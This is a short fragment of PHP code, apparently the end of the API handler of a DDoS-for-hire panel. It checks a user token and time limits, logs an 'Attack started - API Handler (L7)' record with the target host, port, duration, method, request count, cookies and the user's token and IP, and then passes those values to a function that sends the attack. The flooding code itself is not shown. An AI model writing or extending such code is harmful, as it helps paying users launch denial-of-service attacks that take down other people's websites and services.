                        //Cfx_Send_Logs("Attack started - API Handler (L7)","`".$result."`\n\n**Attack Info:** ```Host: $host\nPort: $port\nTime: $time\nMethod: $method\nReq Method: $reqmethod\nReqs: $reqs\nReferrer: $referrer\nCookies: $cookies\nGeo Loc: $geoloc\n\n```**User Info:**```Username: ".$userinfo["username"]."\nCon: $concs\nHandler: $handlers\nPremium: $premiummethod\nDate: $datee\nRequest IP:" .$_SERVER["HTTP_CF_CONNECTING_IP"]."\nToken: ".$token."```", "l7_api");
                        ResponeSendApi($host,$port,$time,$method,$reqmethod,$reqs);
                        die();
                    } //EMPTY ERRORS
                } //TIMELIMIT END
            } //IF METHOD END
        }
    }
} else {
    ResponeSend("No token provided!");
}
?>